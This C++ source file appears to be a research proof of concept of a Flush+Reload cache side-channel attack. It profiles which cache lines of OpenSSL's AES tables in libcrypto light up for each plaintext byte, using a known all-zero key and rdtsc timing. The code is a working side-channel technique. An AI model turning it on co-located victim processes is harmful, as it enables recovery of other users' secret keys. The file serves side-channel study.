#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "../../cacheutils.h"
#include <map>
#include <vector>

// this number varies on different systems
#define MIN_CACHE_MISS_CYCLES (750) //(270)

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (25000)

unsigned char key[] =
{
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  //0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc, 0x4f, 0x6e, 0x9c,
  //0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80
};

size_t sum;
size_t scount;

std::map<char*, std::map<size_t, size_t> > timings;

char* base;
char* probe;
char* end;

int main()
{
  int fd = open("/folderName/openssl/libcrypto.so.1.0.0", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if (map_size & 0xFFF != 0)
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
  end = base + size;

  unsigned char plaintext[] =
  {
  0, 0, 0, 0, 0, 0, 27, 0, 0, 0, 0, 0, 0, 0, 0, 0
  };
  unsigned char ciphertext[128];
  unsigned char restoredtext[128];

  AES_KEY key_struct;

  AES_set_encrypt_key(key, 128, &key_struct);

#define EXP 10
  int m;
  uint64_t  exp_times[EXP][8];
  for(m=0;m<EXP-1;m++)
  {
//    exp_times[m][0]=rdtsc();

  uint64_t min_time = rdtsc();
  srand(min_time);
  sum = 0;
  
exp_times[m][0] = rdtsc();

  for (size_t byte = 0; byte < 256; byte += 16)
  {
//exp_times[m]1] = rdtsc();

    plaintext[0] = byte;
    //plaintext[1] = byte;
    //plaintext[2] = byte;
    //plaintext[3] = byte;

    AES_encrypt(plaintext, ciphertext, &key_struct);
exp_times[m][2] = rdtsc();

    for (probe = base + 0x16c940; probe < base + 0x16cd40; probe += 64) // 16    
    {
exp_times[m][4] = rdtsc();
      size_t count = 0;
      for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
      {
exp_times[m][6] = rdtsc();
        for (size_t j = 1; j < 16; ++j)
          plaintext[j] = rand() % 256;
exp_times[m][7] = rdtsc();
        flush(probe);
        AES_encrypt(plaintext, ciphertext, &key_struct);
        sched_yield();
        size_t time = rdtsc();
        maccess(probe);
        size_t delta = rdtsc() - time;
	
        //printf("delta : %d\n", delta); 

        if (delta < MIN_CACHE_MISS_CYCLES)
	{
          ++count;
	}
      }
exp_times[m][5] = rdtsc();

      sched_yield();
      timings[probe][byte] = count;
      sched_yield();
    }
exp_times[m][3] = rdtsc();
  }

exp_times[m][1]=rdtsc();


  
  
  }





  for (auto ait : timings)
  {
    printf("%p", (void*) (ait.first - base));
    for (auto kit : ait.second)
    {
      printf(",%6lu", kit.second);
    }
    printf("\n");
  }

  close(fd);
  munmap(base, map_size);
  fflush(stdout);

  
  for (m=0;m<EXP-1;m++)
    printf("%llu,%llu,%llu,%llu,%llu,%llu,%llu,%llu\n", exp_times[m][0], exp_times[m][1], exp_times[m][2], exp_times[m][3], exp_times[m][4], exp_times[m][5], exp_times[m][6], exp_times[m][7]);


  for (m=0;m<EXP-1;m++)
    printf("%llu,%llu,%llu,%llu\n", exp_times[m][1] - exp_times[m][0], exp_times[m][3] - exp_times[m][2], exp_times[m][5] - exp_times[m][4], exp_times[m][7] - exp_times[m][6]);


  return 0;
}

